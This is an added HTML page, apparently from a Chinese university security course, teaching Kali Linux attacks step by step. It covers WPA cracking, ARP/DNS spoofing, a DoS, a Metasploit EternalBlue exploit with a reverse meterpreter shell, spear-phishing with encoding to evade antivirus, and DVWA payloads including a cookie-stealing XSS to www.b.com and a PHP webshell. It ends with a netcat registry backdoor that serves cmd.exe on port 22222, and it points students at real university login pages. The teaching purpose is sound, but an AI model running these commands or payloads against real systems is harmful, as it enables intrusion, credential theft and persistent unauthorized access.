+            <li>access point进行验证，通过后发送一把以wifi密码加密的密钥给client</li>
+            <li>client确认该密钥，通信开始</li>
+        </ol>
+    <p>因此，目前的思路是：抓到四次握手包，希望能破解弱的wifi密码，一般过程为：</p>
+    <ol>
+        <li><code>iwconfig</code>查看当前无线接口状态，获取接口名称，一般为wlan0</li>
+        <li><code>airmon-ng start wlan0</code>将无线接口置为监视monitor状态，可再用<code>iwconfig</code>查看，目前名称一般变为wlan0mon</li>
+        <li><code>airodump-ng wlan0mon</code>收集周围的wifi数据，如果出现了要破解的access point则Ctrl-c终止，复制其MAC地址和channel号（假设为44:94:FC:37:10:6E，6）</li>
+        <li><code>airodump-ng wlan0mon -c 6 --bssid 44:94:FC:37:10:6E -w data</code>只收集该access point的数据写到data文件，一旦抓到握手数据则可终止。
+            我们可以同时另外运行<code>aireplay-ng -0 3 -a 44:94:FC:37:10:6E -c 64:A5:C3:DA:30:DC wlan0mon</code>命令，让已经通过认证的client(64:A5:C3:DA:30:DC)重新握手进行认证，以便于可以很快抓到握手数据。
+        </li>
+        <li><code>aircrack-ng -w pass.list -b 44:94:FC:37:10:6E data.cap</code>进行字典破解</li>
+        <!--<li><code></code></li>-->
+    </ol>
+     <p>命令行方式，请看视频明白其过程。
+            <a href="../data/ns/video/10-Aircrack-ng%20to%20Cracking%20WPA%20%20WPA2%20key%20on%20Kali%20Linux.mp4"
+               class="btn btn-primary btn-block" target="_blank">
+                <i class="glyphicon glyphicon-save"></i> aircrack-ng破解WiFi视频
+            </a>
+        </p>
+        <p>图形界面的破解其实是自动集中进行上述步骤，在<code>无线攻击 – 无线工具集</code>菜单中运行<code>fern-wifi-cracker</code>按界面提示运行即可。shell中运行<code>fern-wifi-cracker</code>也可。
+            <a href="../data/ns/video/10-Fern-wifi-cracker.mp4"
+               class="btn btn-primary btn-block" target="_blank">
+                <i class="glyphicon glyphicon-save"></i> Fern破解WiFi视频
+            </a>
+        </p>
+    <p>另类思路的WiFi破解（需两块无线网卡,一块用于数据捕获，一块用于伪造同名Access Point，吸引用户连接这个假的AP，得到输入的口令），大家自行学习。
+        <a href="../data/ns/video/10-Wifi-Craker--New%20Method%202015%20(100%25%20Working).mp4"
+           class="btn btn-primary btn-block" target="_blank">
+            <i class="glyphicon glyphicon-save"></i> 另类方法破解WiFi视频
+        </a>
+    </p>
+    <a href="../data/ns/Mastering Kali Linux Wireless Pentesting.pdf" target="_blank"><img src="../assets/img/wifi.png" width="500px"></a>
+</div>
+
+<h3 id="4-exploit-macof">漏洞利用-Macof</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        先思考问题：
+    <ol>
+        <li>子网中的交换机的工作方式？</li>
+        <li>交换机何时进行广播？</li>
+        <li>交换机端口地址列表是否有限？</li>
+    </ol>
+    </p>
+    <p>
+        明白这些问题后，则macof命令将瞬时发送大量伪造的MAC，填满子网中所有交换机端口地址列表空间。结果可能如下：</p>
+    <ol>
+        <li>失效开放，将到来的流量进行广播，实际就变成了Hub（可以抓包了！） </li>
+        <li>失效关闭，暂停发送到来的流量，相当于发起了一次拒绝服务攻击      </li>
+    </ol>
+    <p>一般而言，可采用限制单个交换机端口的MAC地址数量或设置MAC地址范围进行过滤来防御。</p>
+    
+    <p>命令如下</p><div class="alert alert-danger"><i class="glyphicon glyphicon-info-sign">
+        </i>请注意一定不要在10.1.74.0/24这个生产环境中运行！！！查看以下视频即可。</div>
+    <div class="highlight">
+        <pre><code class="hljs"> macof –i eth1</code></pre>
+    </div>
+    <a href="../data/ns/video/10-Macof.mp4"
+       class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> 交换机洪泛Macof视频
+    </a>
+    </p>
+</div>
+
+<h3 id="4-exploit-yersinia">漏洞利用-Yersinia</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        在一个DHCP的网络环境中如WiFi环境，通过向DHCP服务器发送大量的垃圾请求，耗尽其地址池，使得DHCP服务器不能为正常的请求服务。
+    </p>
+    <p>
+        把10.1.74.113搭建为实验用的DHCP服务器。先远程桌面连接.113，然后下载并安装<a href="../data/ns/OpenDHCPServerInstallerV1.66.exe">OpenDHCPServer.exe</a>，从windows菜单中选择
+        <code>Run Stand Alone</code>启动OpenDHCPServer。
+    </p>
+    <p>
+    运行<code> yersinia –G </code>命令,然后点击<code> launch attack </code>
+        ，选择DHCP窗口中的<code> send DISCOVER packet </code>开始发送请求，然后选择<code>List Attacks</code>停止发送。此时查看DHCP服务器，可看到地址很快被分配完毕。
+    </p>
+    <p>而这不是我们真正想干的！此时如果再选择<code> launch attack </code>窗口中的<code> creating DHCP server </code>，
+        则yersinia自己运行一个DHCP服务，结果是当有DHCP请求到来时，分配的是攻击者设置的相类似的网络配置，请注意返回的网关和DNS服务器地址（致命的！）
+    </p>
+    <p>其它Yersinia用法请参考
+        <a href="../data/ns/video/10-Yersinia.wmv" class="btn btn-primary btn-block" target="_blank">
+            <i class="glyphicon glyphicon-save"></i> Yersinia视频
+        </a>
+    </p>
+</div>
+
+<h3 id="4-exploit-arpspoof">漏洞利用-Arpspoof</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>在被欺骗主机和网关之间充当中间人，获取它们的数据。</p>
+    <p>假设网络环境如下：攻击机Kali（10.1.74.128），被骗主机（10.1.74.113），网关（10.1.74.1）</p>
+    <div class="alert alert-danger"><i class="glyphicon glyphicon-info-sign"></i>
+        请注意：不要对10.1.74.0/24生产环境中的主机进行欺骗！！！
+    </div>
+    <p>先使用以下命令启用攻击机的路由转发功能（0表示关闭）：
+        <div class="highlight">
+            <pre><code class="hljs"> echo 1 > /proc/sys/net/ipv4/ip_forward </code></pre>
+        </div>
+    </p>
+    <p>
+        使用以下命令欺骗10.1.74.113，我（.128）是网关（10.1.74.1）：
+        <div class="highlight">
+            <pre><code class="hljs"> arpspoof  -t 10.1.74.113 10.1.74.1 </code></pre>
+        </div>
+    </p>
+    <p>
+        打开另一个窗口，使用以下命令欺骗网关10.1.74.1，我（.128）是被骗主机10.1.74.113：
+    <div class="highlight">
+        <pre><code class="hljs"> arpspoof  -t 10.1.74.1 10.1.74.113 </code></pre>
+    </div>
+    </p>
+    <p>
+        此时在被骗主机10.1.74.113的arp缓存中可以看到网关的MAC地址是攻击者的MAC。
+        在攻击主机上启动wireshark抓取被骗主机的数据，则不仅仅是密码之类，如果你能发现cookie（可使用http.cookie进行过滤），再通过cooikes工具如chrome插件EditCookie等，那你就可以代替受害者从容登录他的QQ、微博、网盘……
+    </p>
+    <p>停止攻击后，需待缓存失效才能正常工作，此时可在被骗主机上用命令<code>arp –d * </code>提前清除垃圾缓存。</p>
+    <a href="../data/ns/video/10-ARPSpoofingMITM.mp4" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> ArpSpoof视频
+    </a>
+</div>
+
+<h3 id="4-exploit-ettercap">漏洞利用-Ettercap</h3>
+<!--<h3>更多的使用方法如DHCP欺骗等，使用其命令行方式，结果查看需用！！！</h3>-->
+<div class="bs-callout bs-callout-info">
+    <p>
+        <code> 嗅探/欺骗-网络欺骗 </code>菜单中的ettercap-graphical是Linux下一个强大的抓包、协议分析工具。用命令<code>ettercap -G</code>也可启动
+    </p>
+    <p>
+        启动后，选择<code> Sniff </code>菜单中<code> Unified sniffing </code>模式，在弹出的窗口中指定接口即可进行抓包。
+    </p>
+    <div class="alert alert-danger"><i class="glyphicon glyphicon-info-sign"></i>
+        请注意：不要对10.1.74.0/24生产环境中的主机进行欺骗！！！
+    </div>
+
+    <p>Arp欺骗</p>
+    <ol>
+        <li>如前指定接口开始抓包后，在<code>hosts</code>菜单中选择<code>Scan for hosts</code>扫描本子网中的主机并用菜单<code>Hosts list</code>列出        </li>
+        <li>选定要欺骗的两方（网关如10.1.74.1和另一主机如10.1.74.113）作为target1和target2        </li>
+        <li>然后在<code>MITM</code>（中间人攻击Man In The Middle）菜单中选择<code>arp position</code>，在弹出的菜单中选择<code>sniffing remote connection</code>        </li>
+        <li>此时在受害主机上查看arp记录即可看到攻击成功。也可在ettercap菜单中选择<code>View->Connetctions</code>查看捕获的连接，双击可查看数据 </li>
+        <li>可在<code>MITM</code>（中间人攻击Man In The Middle）</code>菜单中选择<code>Stop mitm attack</code>停止攻击</li>
+    </ol>
+    </p>
+    <p>DNS欺骗</p>
+    <ol>
+        <li>在如前所示的arp欺骗的基础上，让被害主机的DNS请求发到中间主机上        </li>
+        <li>先编辑<code>/etc/ettercap/etter.dns</code>文件，添加如<code>baidu.com A 202.202.243.2</code>之类的记录</li>
+        <li>在ettercap菜单选择<code>Plugins->Manage the plugins </code>,双击<code>dns-spoof</code>开始DNS欺骗 </li>
+        <li>此时在被骗主机10.1.74.113上浏览baidu，看到的是202.202.243.2首页而非百度！ 使用<code>ipconfig/displaydns</code>也可查看</li>
+        <li>再次双击<code>dns-spoof</code>停止DNS欺骗</li>
+    </ol>
+    <p>
+        DoS攻击（一定注意不要针对正常运行的网站！！！）
+    </p>
+    <ol>
+        <li>先浏览10.1.74.113，得到正常的访问</li>
+        <li>启动ettercap，指定接口开始捕获后，在ettercap的插件菜单双击<code>doS_attack</code>插件，填入目标IP如10.1.74.113，伪造IP地址10.1.74.222即可 </li>
+        <li>抓包可看到瞬间发送大量的SYN包，此时访问受害主机10.1.74.113已经不可行。再次双击<code>doS_attack</code>停止DoS攻击。远程桌面连接重置10.1.74.113的Web服务器apache的状态。</li>
+    </ol>
+    <p>在<code>MITM</code>菜单中还可进行DHCP欺骗等，请继续探索Ettercap！！！ </p>
+    <a href="../data/ns/video/10-Ettercap.mp4" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> Ettercap视频
+    </a>
+</div>
+
+<h3 id="4-exploit-metasploit">漏洞利用-Metasploit</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        Metasploit是一款开源、免费的漏洞利用工具，漏洞攻击是指利用目标系统的漏洞，攻击者通过Metasploit执行远程代码。
+    </p>
+    <p>
+        使用Metasploit之前，我们一般需利用Nessus、OpenVAS、Nmap等扫描工具锁定目标并发现相关漏洞，下面以windows系统较新的ms17-010漏洞为例。
+    </p>
+    <p>一般步骤</p>
+    <ol>
+        <li>在shell中启动Metasplpoit需要的数据库服务</li>
+    <div class="highlight">
+        <pre><code class="hljs"> #service postgresql start </code></pre>
+    </div>
+        <li>如果第一次运行，则初始化Metasploit数据库</li>
+    <div class="highlight">
+        <pre><code class="hljs"> #msfdb init </code></pre>
+    </div>
+    <li>在shell中启动Metasploit控制台</li>
+    <pre><code>#msfconsole</code></pre>
+    <li>现在进入了控制台，使用如下命令重建Metasploit数据库cache</li>
+    <div class="highlight">
+        <pre><code class="hljs"> msf>db_rebuild_cache  </code></pre>
+    </div>
+    <li>使用如下命令搜索与此漏洞相关的攻击程序，注意程序的位置和级别normal、good、great、excellent</li>
+    <div class="highlight">
+        <pre><code class="hljs"> msf>search ms17_010   </code></pre>
+    </div>
+    <li>使用如下命令使用上一步搜索到的漏洞攻击程序（注意：scanner中的模块可用于测试目标是否可用）</li>
+    <div class="highlight">
+        <pre><code class="hljs"> msf>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
+    </div>    
+    <li>使用如下命令查看一下该模块的用法及选项。注意必填项目，如processname，RHOST等</li>
+    <div class="highlight">
+        <pre><code class="hljs"> msf>show options </code></pre>
+    </div>
+    <li>使用如下命令设置远程受害主机</li>
+    <div class="highlight">
+        <pre><code class="hljs"> msf>set RHOST 10.1.74.113 </code></pre>
+    </div>
+    <li>使用如下命令设置本地攻击主机</li>
+    <div class="highlight">
+        <pre><code class="hljs"> msf>set LHOST 10.1.74.128 </code></pre>
+    </div>
+    <li>查看攻击成功后如何与攻击者联系。有图形方式、字符方式（常用），有正向、反向（常用）连接两种方式，如<code>windows/shell/reverse_tcp</code>
+        即成功后主动从受害者主机连接到攻击者，提供给攻击者一个受害主机的shell，而<code>windows/shell_bind_tcp</code>则在受害主机上打开一个端口等待命令</li>
+    <div class="highlight">
+        <code class="hljs"> msf>show payloads </code>
+    </div>
+    <li>使用如下命令使用指定的攻击载荷。meterpreter比直接的shell好，是因为该载荷完全在内存中，有助于躲避杀毒软件</li>
+    <div class="highlight">
+        <pre><code class="hljs"> msf>set payload windows/x64/meterpreter/reverse_tcp </code></pre>
+    </div>
+    <li>开始行动（run命令也可）。一切正常的话，其控制权已获取，敲 ？查看可用命令，显示/新建/下载文件、键盘记录、屏幕快照、摄像头操作等等，exit退出meterpreter回到Metasploit。</li>
+    <div class="highlight">
+        <pre><code class="hljs"> msf>exploit </code></pre>
+    </div>
+    </ol>
+    <p>Metasploit工具异常强大，请继续探索！！！<a href="../data/ns/video/10-Metasploit%20%20to%20Hack%20a%20Remote%20Computer%20.mp4" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> Metasploit视频1
+    </a> <a href="../data/ns/video/10-Metasploit%20attack%20on%20Windows%207%2032%20and%2064%20bit.mp4" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> Metasploit视频2
+    </a><a href="../data/ns/video/10-Metasploit%20MS12-020%20RDP%20Vulnerability%20.mp4" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> Metasploit视频3
+    </a></p>
+</div>
+
+<h3 id="4-exploit-armitage">漏洞利用-Armitage</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        Armitage可看作Metasploit的图形界面版本。实际攻击中不建议使用。</p>
+    <p>一般步骤如下：</p>
+
+    <ol>
+        <li>在<code>漏洞利用 – 网络漏洞利用 </code>菜单下启动armitage或者直接使用命令<code>armitage</code>。注意时间可能较长，如提示启动RPC-MSFserver，选是然后等待即可</li>
+        <li>在菜单<code>Hosts->Nmap Scan->Quick Scan(OS detect)</code>中使用MSF集成的扫描工具Nmap扫描要渗透的主机。可以指定单独的目标，也可以指定网段（带掩码），此处我们指定虚拟机的IP（扫描完成后可以在下方的控制台看到扫描结果）  </li>
+        <li>在菜单<code>Attacks->Find Attacks</code>中扫描可能的漏洞 </li>
+        <li>在目标上鼠标右键查看可能的漏洞，能否成功使用<code>check expoits </code> </li>
+        <li>使用smb检测，发现ms08_067漏洞可用</li>
+        <li>出现对话框后注意选择正确的OS以利于攻击成功，如果成功目标将变红        </li>
+        <li>点击右键选择Meterperter，现在可以对受害者主机浏览文件、查看桌面、记录键盘、进入命令窗口等等        </li>
+    </ol>
+    </p>
+    <p><a href="../data/ns/video/10-ARMITAGE.mp4" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> Armitage视频
+    </a></p>
+</div>
+
+<h3 id="5-exploit-set">社会工程学-SET</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        SET即Social-Engineer Toolkit的简称。当要花费数天，数周，甚至数月时间尝试进行单纯的网络攻击时，此时我们完全可以考虑SET，欺骗某人运行某个可以给你高权限接入他们机器或设备的文件，从而达到目的
+    </p>
+    <p>在<code> 漏洞利用 – Social Engineering Tookit </code>菜单下运行setoolts或者命令<code>setoolkit</code>后出现SET主界面，选择SET Attack可以看到如下菜单</p>
+
+    <ol>
+        <li>Spear-Phishing Attack Vectors（钓鱼）    </li>
+        <li>Website Attack Vectors（Web欺骗）</li>
+        <li>Infectious Media Generator（制作带恶意代码的移动介质如U盘） </li>
+        <li>······</li>
+        <li>Return back to the main menu.</li>
+    </ol>
+    </p>
+    <p>下面我们以所谓的鱼叉式钓鱼进行说明</p>
+    <ol>
+        <li>Perform a Mass Email Attack（发送欺骗邮件）</li>
+        <li>选择恶意代码Payload（不是每个都可用）</li>
+        <li>选择控制对方的方式，一般选2（反弹TCP连接，即受害者主动连接攻击者）</li>
+        <li>选择一种恶意代码的编码方式以逃避检测（16）</li>
+        <li>选择反弹连接的端口</li>
+        <li>选择负载恶意代码的文件类型（如word文件）</li>
+        <li>邮件附件的压缩方式</li>
+        <li>附件文件名称（需能吸引双击的名字）</li>
+        <li>是单发还是群发（群发需建立一个多邮件地址的文本文件）</li>
+        <li>用现有的邮件模版还是自己编邮件内容</li>
+        <li>收发邮件的地址（需要一个Gmail的信箱）</li>
+        <li>是否标记邮件的优先权</li>
+        <li>是否开始侦听</li>
+        <li>等待中招......</li>
+    </ol>
+    <p>另外一个选项<code>Website Attack Vectors（Web欺骗）</code>与上类似，但是通过克隆站点引导运行JavaApplet来中招
+    </p>
+    <p>渗透测试中，SET是需要好好研究使用的！<a href="../data/ns/video/10-（SET）How%20To%20Hack%20Someone's%20E-mail%20password%20With%20BackTrack%205.mp4" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> SET视频1
+    </a>
+        <a href="../data/ns/video/10-SET.exe" class="btn btn-primary btn-block" target="_blank">
+            <i class="glyphicon glyphicon-save"></i> SET视频2
+        </a></p>
+
+    <p>请用 <a href="../data/ns/SumatraPDF-3.0-install.exe" class="btn btn-success"> SumatraPDF 软件 </a> 打开该epub文档</p>
+    <a href="../data/ns/set.epub" target="_blank"><img src="../assets/img/set.png" width="500px"></a>
+    
+</div>
+<hr>
+<h3 id="6-web-w3af">当前，Web应用是非常普通和常用的，因此，围绕Web应用程序的各种漏洞层出不穷，我们单独列出以示重视。</h3>
+    
+<h3 id="6-web-Nikto">Web漏洞-Nikto</h3>
+<div class="bs-callout bs-callout-info">
+  <pre><code>nikto -h http://10.1.74.114/mutillidae/ -o result.html</code></pre>  
+    
+</div>
+<h3 id="6-web-owasp-zap">Web漏洞-OWASP-ZAP</h3>
+<div class="bs-callout bs-callout-info">
+  <pre><code>在菜单中选择或执行owasp-zap</code></pre>  
+  <p>在OWASP-ZAP界面中输入url即可。可得到非常详尽但比较费时的测试结果。</p>  
+</div>
+<!--<h3 id="6-web-w3af">Web漏洞-W3af</h3>
+
+<div class="bs-callout bs-callout-info">
+    
+    <p>在<code> Web程序 – Web漏洞扫描 </code>菜单下的<code> W3af </code>是一个web应用安全的审计、攻击平台</p>
+    </p>
+    <p>一般方法为：输入要扫描的站点，再从左边选择需要进行安全审核的内容，一般可选择<code> OWASP_TOP10 </code>，告诉W3AF主要检查OWASP评出的10大安全问题或high-risk高危的</p>
+    <p><a href="../data/ns/video/10-W3af%20-%20Web%20Application%20Attack%20and%20Audit%20Framework.mp4" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> W3af视频
+    </a></p>
+</div>-->
+<h3 id="6-web-scarab">Web漏洞-WebScarab</h3>
+
+<div class="bs-callout bs-callout-info">
+    <p>
+        漏洞扫描完成后，则可用<code>WebScarab</code>这个工具对目标网站的链接、网页和访问受限网页进行详细的审查、读取、记录和分析
+
+    </p>
+    <p>在<code> Web程序 – Web漏洞扫描 </code>菜单下启动webscarab后，默认是一个代理软件（8008），在其tool 菜单中可设置为单功能面板
+    </p>
+    </p>
+    <p>代理功能-proxy
+        <ol>
+            <li>用google搜索技术得到并访问以下两个网址http://xgxt.cqjtu.edu.cn/login.aspx和http://xwcb.cqjtu.edu.cn/Sys/Employee/login.aspx，从源文件我们可见其用JS进行了相关限制
+            </li>
+            <li>
+                启动WebScarab的Proxy的拦截（intercept）功能对请求或应答进行修改来突破限制
+            </li>
+        </ol>
+    </p>
+    <p>网站抓取-spider。访问某网站后，使用<code> Fetch Tree </code>可得到详细的网站目录及文件信息
+
+    </p>
+
+    <p><a href="../data/ns/video/10-WebScarab.mp4" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> WebScarab视频
+    </a></p>
+</div>
+
+<h3 id="6-web-bs">Web漏洞-Burp Suite</h3>
+<div class="bs-callout bs-callout-info">
+    <p>
+        与WebScarab类似，Burp Suite用于攻击web应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。我们只用其免费的社区版即可。
+    </p>
+    <p>当Burp Suite 运行后，Burp Proxy 开起默认的8080 端口作为本地代理接口。通过置一个web 浏览器使用其代理服务器，所有的网站流量可以被拦截，查看和修改。默认情况下，对非媒体资源的请求将被拦截并显示(可以通过Burp Proxy 选项里的options 选项修改默认值)。对所有通过Burp Proxy 网站流量使用预设的方案进行分析，然后纳入到目标站点地图中，来勾勒出一张包含访问的应用程序的内容和功能的画面。在Burp Suite 专业版中，默认情况下，Burp Scanner是被动地分析所有的请求来确定一系列的安全漏洞。
+    </p>
+    <p>其功能如下：
+    <ol>
+        <li>Proxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</li>
+        <li>Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</li>
+        <li>Scanner[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞。</li>
+        <li>Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</li>
+        <li>Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。</li>
+        <li>Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</li>
+        <li>Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。</li>
+        <li>Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</li>
+    </ol>
+    </p>
+    <p>在Web渗透测试中，Burp Suite异常强大，请好好研究使用的！<a href="../data/ns/video/10-Burp%20Suite.mp4" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> Burp Suite视频
+    </a></p>
+    <a href="../data/ns/Burp Suite Starter.pdf" target="_blank"><img src="../assets/img/burpsuite.png" width="500px"></a>
+</div>
+
+
+<h3 id="6-web-DVWA">Web漏洞-DVWA</h3>
+<div class="bs-callout bs-callout-info">
+    <p>
+        DVWA即Damn Vulnerable Web Application之意，是故意建造的一个有许多主流Web漏洞的<b>Apache/PHP/MySQL</b>网站，当然也是我们Web漏洞渗透练习的最佳平台。
+    </p>
+    <p>DVWA在两个平台中可用，其一是我们前面安装的<a href="http://10.1.74.114/dvwa/" target="_blank"><code> Metasploitable-linux-2 </code></a>虚拟机，其二是虚拟机平台<code> Web Security Dojo </code>，下载及安装请参见下面的WebGoat部分。
+    </p>
+    <p>无论使用哪种，我们都可以打开浏览器，输入<code> http://ip/dvwa </code>即可看到页面。需要注意的是：先在<code>Security</code>中设置难度级别为低，随着深入调整为中高；使用过程中可查看相关提示和信息；无需担心网站被搞垮，随时可进入<code>Setup</code>重置数据库进行恢复。</p>
+    <p>DVWA演示的漏洞简介如下（请参考教程）：
+    <ol>
+        <li>暴力破解(Brute Force)：除前面讲述的Hydra暴破教程外，BurpSuite也进行破解 </li>
+        <li>命令执行(Command Execution：如填入10.1.74.1 && /sbin/ifconfig，看看发生了什么。注意区分后台的操作系统（Windows用;分割命令，Linux用&&分割命令） </li>
+        <li>跨站请求伪装(CSRF, Cross Site Request Forgery)：将admin的密码由原来的password修改为123后，注意此时的URL以及cookie。复制该URL，打开新浏览器窗口，粘贴到地址栏，修改密码为456，也能成功执行，原因是通过验证后，验证保存在PHPSESSID中。
+            <br>现实中，以上做法当然没什么。但设想一下，如果你登录了ICBC没有登出，然后引导你访问一个包含如下内容的网页可能发生什么？
+            <div class="highlight">
+<pre><code class="html hljs">&lt;img src="https://ICBCbank.com/transfer.do?acct=张三&amount=100000" width="1" height="1" border="0">
+</code></pre></div>
+        </li>
+        <li>文件包含(File Inclusion)：是PHP的一种展示页面的技术，查看URL可知当前显示的是include.php页面。
+            <br>那么把它改为/etc/passwd将如何（如果后台是Windows系统，可考虑C:\Windows\System32\drivers\etc\hosts)？此时不应显示的文件（操作系统的密码文件）出现了！</li>
+        <li>SQL注入(SQL Injection)：本来是提供输入用户ID返回该用户的信息的功能。通过查看源文件（现实中不可行），或用<code>1' or user_id='2</code>进行测试，只要返回结果或语法错误之类都可知有SQL注入漏洞。
+            <br>试试<code>1' union select first_name,password from users #</code>，#为MySQL的注释。
+            <br>SQL盲注即屏蔽了出错后信息，让用户修改注入语句较难而已。更强大的注入测试及自动注入请学习<a href="http://www.sqlmap.org" target="_blank">SQLMap工具</a>
+        </li>
+        <li>文件上传(File Upload)：未检查文件的类型，还给出了文件存储位置信息等。导致可直接传入木马文件再访问执行（还可将木马伪装为图片文件等类型）</li>
+        <li>反射型跨站脚本(XSS, Reflected Cross Site Scripting，避免和CSS混淆)：提交非正常的内容如
+            <div class="highlight">    <pre><code class="html hljs">&lt;script>alert('XSS, haha')&lt;/script&gt;                </code></pre>
+            </div>        
+            注意：当前Chrome直接拦截，Edge或IE可成功。
+            <br>理论上，所有可输入的地方没有对输入数据进行处理的话，都会存在XSS漏洞，漏洞的危害取决于攻击代码的威力，攻击代码也不局限于script。
+        </li>
+        <li>存储型跨站脚本(Stored Cross Site Scripting)：将恶意脚本提交后将被存储在数据库中，其后访问的人将受害。如：<br>
+        a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，
+        <div class="highlight"><pre><code>&lt;script>window.open('www.b.com?param='+document.cookie)&lt;/script&gt;</code></pre></div>
+        ，保存文章。这时张三和李四看到了我发布的文章，当在查看我的文章时他们的cookie信息都发送到了我的服务器www.b.com上！
+                </li>
+    </ol>
+    </p>
+    <p>下面介绍一个稍微综合的例子，请将DVWA重置且调到中级难度：
+        <ol>
+            <li>在Kali上新建文件webshell.php(所谓的小马，可执行简单命令，特别用于挂大马)如下：
+                <pre><code>&lt;?
+system($_POST['cmd']);
+echo '&lt;form method="post" action="../../hackable/uploads/webshell.php">&lt;input type="text" name="cmd"/>&lt;/form>';
+?&gt;               </code></pre>
+            </li>
+            <li>在Kali上新建文件rename.php(用于改文件名)如下：
+                <pre><code>&lt;?
+system('mv ../../hackable/uploads/webshell.jpg ../../hackable/uploads/webshell.php');
+?&gt;               </code></pre>
+            </li>
+            <li>此时在DVWA中上传这两个文件将不成功，因为中级难度限制了文件类型，所以修改如下后再上传：
+                <pre><code>cp rename.php rename.jpg
+cp webshell.php webshell.jpg                                   </code></pre>
+            </li>
+            <li>在DVWA的文件包含中，修改包含的文件为<code>../../hackable/uploads/rename.jpg</code>，此时没什么反应，但实际该文件为php文件，已经执行了。做了什么？</li>
+            <li>现在服务器上已经有我们的webshell.php文件了，接下来在文件包含中使用该文件<code>../../hackable/uploads/webshell.php</code></li>
+            <li>此时应该可以看到我们的命令输入框，输入<code>/sbin/ifconfig或uname -a</code>等命令试试</li>
+            <li>如果只是完成执行命令，那么上面的rename是不需要的，直接包含webshell.jpg即可，但这样的话还可以上传其它符合上传要求的伪造文件如NetCat.jpg（所谓的大马）并改名执行，达到长期控制目的</li>
+            <!--<li></li>
+            <li></li>-->
+        </ol>
+
+    </p>
+    <p><a href="../data/ns/10-Dojo下DVWA的使用和漏洞分析.pdf" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> DVWA教程
+    </a></p>
+    <p>DVWA网上教程（推荐）</p>
+<a href="http://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=688b0913be93a4d95daed400990c4745&TYPE=SUB" target="_blank"><img src="../assets/img/dvwa.png" width="500px"></a>
+<br />
+<p>另外一个Web渗透环境Mutillidae：Born to be Hacked 也可以学习，我们已经在<a href="http://10.1.74.113/mutillidae/" target="_blank">地址一（.113）</a>和<a href="http://10.1.74.114/mutillidae/" target="_blank">地址二（.114）</a>搭建好。网上教程如下：</p>
+<a href="http://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=688b0913be93a4d95daed400990c4745&TYPE=SUB" target="_blank"><img src="../assets/img/mutillidae.png" width="500px"></a>
+
+</div>
+
+<h3 id="6-web-WebGoat">Web漏洞-WebGoat</h3>
+<div class="bs-callout bs-callout-info">
+    <p>
+        对DVWA有相关认识后，强烈建议再学习WebGoat，一个基于Java的更复杂、更成体系的Web渗透环境，但WebGoat只位于<code>Web Security Dojo</code>，需要你安装。
+    </p>
+    <p><a href="../data/ns/vdi/Web_Security_Dojo-2.0.ova" class="btn btn-primary btn-block" target="_blank">
+        <i class="glyphicon glyphicon-save"></i> Web Security Dojo 虚拟机下载
+    </a></p>
+</div>
+<p>Web渗透学习也推荐如下书籍</p>
+<a href="../data/ns/Web Penetration Testing with Kali Linux, Second Edition.pdf" target="_blank"><img src="../assets/img/web1.png" width="500px"></a>
+<a href="../data/ns/Kali Linux Web Penetration Testing Cookbook.pdf" target="_blank"><img src="../assets/img/web2.png" width="500px"></a>
+
+<h3 id="7-backdoor">维持访问/留门</h3>
+<div class="bs-callout bs-callout-info">
+    <p>
+        为了维持对已经渗透了系统的持续访问或控制，我们需要留门，即安装木马。该文件在正常防范的系统中常被识别为木马（本身也是！）而被删除或拦截！使用时请注意。
+    </p>
+    <p>留门的方式有多种，渗透Web应用后加入小马大马等。在此我们以Metasploit攻破的XP系统为例（在Metasploit或Armitage中选择使用meterpreter shell）    </p>
+    <ol>
+        <li>上传木马文件瑞士军刀<code> Netcat </code></li>
+        <div class="highlight">
+<pre><code class="hljs">meterpreter> upload nc.exe c:\\windows\\system32
+</code></pre></div>
+        <li>写入目标机器注册表开机启动项，让nc侦听在22222端口且一旦连接则返回cmd即shell        </li>
+        <div class="highlight">
+<pre><code class="hljs">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v YES -d "C:\\windows\\system32\\nc.exe -Ldp 22222 -e cmd.exe"
+</code></pre></div>
+        <li>重启目标机        </li>
+        <div class="highlight">
+<pre><code class="hljs">meterpreter> reboot
+</code></pre></div>
